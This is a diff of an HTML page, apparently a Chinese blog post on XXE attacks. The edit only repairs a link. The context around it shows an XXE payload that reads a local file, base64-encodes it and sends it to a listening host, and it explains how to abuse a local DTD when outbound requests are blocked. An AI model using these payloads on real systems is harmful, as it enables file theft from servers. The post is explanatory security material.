@@ -689,7 +689,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &#x27;http://172.18.240.1:8085/?p=%file;&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>结果发现%file并没有解析</p>
-<p><a target="_blank" rel="noopener" href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf%E7%AC%AC10%E9%A1%B5%E6%98%8E%E7%A1%AE%E4%BA%86%EF%BC%8CXML%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%8D%E4%BC%9A%E8%A7%A3%E6%9E%90%E5%90%8C%E7%BA%A7%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf第10页明确了，XML解析器不会解析同级参数实体的内容。</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></p>
+<p>第10页明确了，XML解析器不会解析同级参数实体的内容。</p>
 <p>但是当两个参数不是同级，用另外一个标签去嵌套后，就能使用另一个参数实体</p>
 <h3 id="XXE引用本地DTD"><a href="#XXE引用本地DTD" class="headerlink" title="XXE引用本地DTD"></a>XXE引用本地DTD</h3><p>如果目标机器不允许请求外网DTD呢?</p>
 <p>ubuntu系统自带&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd，其中定义了很多参数实体并调用了它。如果我们重写一个参数实体（ISOamso）并引用它，该参数实体依旧在外部</p>
